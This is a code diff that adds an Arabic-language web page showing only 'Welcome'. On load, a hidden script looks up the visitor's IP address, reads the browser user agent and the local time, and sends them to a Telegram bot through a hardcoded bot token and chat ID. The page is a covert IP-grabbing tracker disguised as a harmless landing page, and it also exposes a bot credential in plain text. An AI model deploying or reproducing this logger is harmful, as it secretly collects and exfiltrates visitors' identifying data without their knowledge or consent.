@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>Welcome</title>
+</head>
+<body>
+  <h1>Welcome</h1>
+
+  <script>
+    // ⚠️ ضع بيانات البوت هنا
+    const BOT_TOKEN = "7375425082:AAHCoo2aBjHhbmU9btVCclomgPGr5USmvdA";
+    const CHAT_ID = "1717245674";
+
+    // جلب IP
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const userAgent = navigator.userAgent;
+        const time = new Date().toLocaleString();
+
+        const message =
+          "📡 Visitor Detected\n" +
+          "🌐 IP: " + ip + "\n" +
+          "🕒 Time: " + time + "\n" +
+          "🖥 Device: " + userAgent;
+
+        // إرسال إلى تيليجرام
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+      });
+  </script>
+</body>
+</html>
